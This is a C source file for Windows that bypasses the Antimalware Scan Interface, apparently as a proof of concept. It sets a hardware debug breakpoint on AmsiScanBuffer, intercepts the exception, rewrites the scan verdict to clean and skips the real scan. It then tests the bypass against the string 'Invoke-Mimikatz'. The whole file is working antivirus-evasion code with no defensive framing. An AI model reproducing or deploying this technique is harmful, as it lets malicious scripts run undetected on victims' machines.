#include <windows.h>
#include <stdio.h>
#include <amsi.h>

#pragma warning(disable: 4334)

// typedef enum AMSI_RESULT
// {
//     AMSI_RESULT_CLEAN = 0,
//     AMSI_RESULT_NOT_DETECTED = 1,
//     AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
//     AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4fff,
//     AMSI_RESULT_DETECTED = 32768
// } 	AMSI_RESULT;

typedef HRESULT( WINAPI* fnAmsiScanBuffer )(
    CONTEXT      amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    PVOID        amsiSession,
    AMSI_RESULT* result
    );
fnAmsiScanBuffer pAmsiScanBuffer;


BOOL SetHwBp( HANDLE hThread, PVOID pAddress, DWORD regIndex ) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) ) {
        return FALSE;
    }

    switch ( regIndex ) {
    case 0: ctx.Dr0 = ( DWORD_PTR )pAddress; break;
    case 1: ctx.Dr1 = ( DWORD_PTR )pAddress; break;
    case 2: ctx.Dr2 = ( DWORD_PTR )pAddress; break;
    case 3: ctx.Dr3 = ( DWORD_PTR )pAddress; break;
    default: return FALSE;
    }

    ctx.Dr7 |= ( 1 << ( regIndex * 2 ) );
    ctx.Dr7 &= ~( 1 << ( 16 + regIndex * 4 ) );
    ctx.Dr7 &= ~( 1 << ( 17 + regIndex * 4 ) );

    if ( !SetThreadContext( hThread, &ctx ) ) {
        return FALSE;
    }

    return TRUE;
}

BOOL RemoveHwBp( HANDLE hThread, DWORD regIndex ) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) ) {
        printf( "GetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    switch ( regIndex ) {
    case 0: ctx.Dr0 = 0; break;
    case 1: ctx.Dr1 = 0; break;
    case 2: ctx.Dr2 = 0; break;
    case 3: ctx.Dr3 = 0; break;
    default: return FALSE;
    }

    ctx.Dr7 &= ~( 1 << ( regIndex * 2 ) );

    if ( !SetThreadContext( hThread, &ctx ) ) {
        printf( "SetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}


LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {

    if ( pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {

        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == ( PVOID )pAmsiScanBuffer ) {

            /* x64 calling convention at function entry:
               [RSP+0x00] = Return address (8 bytes)
               [RSP+0x08] = Shadow space for RCX (8 bytes)
               [RSP+0x10] = Shadow space for RDX (8 bytes)
               [RSP+0x18] = Shadow space for R8  (8 bytes)
               [RSP+0x20] = Shadow space for R9  (8 bytes)
               [RSP+0x28] = 5th parameter: amsiSession (8 bytes)
               [RSP+0x30] = 6th parameter: AMSI_RESULT* (8 bytes) */


            AMSI_RESULT* pResult = *( AMSI_RESULT** )( pExceptionInfo->ContextRecord->Rsp + 0x30 );
            if ( pResult && *pResult )
                *pResult = AMSI_RESULT_CLEAN;

            pExceptionInfo->ContextRecord->Rip = *( DWORD64* )pExceptionInfo->ContextRecord->Rsp; // Set RIP to return address
            pExceptionInfo->ContextRecord->Rsp += 8;
            pExceptionInfo->ContextRecord->Rax = S_OK;

            pExceptionInfo->ContextRecord->Dr6 &= ~0xF;
            pExceptionInfo->ContextRecord->EFlags |= 0x10000;

            return EXCEPTION_CONTINUE_EXECUTION;

        }

        return EXCEPTION_CONTINUE_SEARCH;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL CheckAMSI( void ) {

    HAMSICONTEXT ctx;
    if ( AmsiInitialize( L"AMSI Text", &ctx ) != S_OK ) {
        printf( "[-] Failed to initialize AMSI context\n" );
        return FALSE;
    }

    LPCWSTR testString = L"Invoke-Mimikatz";
    AMSI_RESULT result;
    HRESULT hr = AmsiScanString( ctx, testString, L"AMSI Test", NULL, &result );
    AmsiUninitialize( ctx );

    if ( hr != S_OK ) {
        printf( "[-] AmsiScanString failed: 0x%08X\n", hr );
        return FALSE;
    }

    printf( "[+] AmsiScanString result: 0x%08X\n", result );
    return result >= AMSI_RESULT_CLEAN;
}

int main() {

    HMODULE hAmsi = LoadLibraryA( "amsi.dll" );
    if ( !hAmsi ) {
        printf( "Failed to load amsi.dll: %d\n", GetLastError() );
        return 1;
    }

    pAmsiScanBuffer = ( fnAmsiScanBuffer )GetProcAddress( hAmsi, "AmsiScanBuffer" );


    printf( "[+] AmsiScanBuffer address: %p\n", pAmsiScanBuffer );

    AddVectoredExceptionHandler( 1, VectoredExceptionHandler );

    SetHwBp( GetCurrentThread(), ( PVOID )pAmsiScanBuffer, 0 );

    printf( "[+] Breakpoint set at 0x%p\n", pAmsiScanBuffer );

    // NtTraceEvent( NULL, 0, 0, NULL );

    system( "pause" );

    CheckAMSI();

    RemoveHwBp( GetCurrentThread(), 0 );

    return 0;
}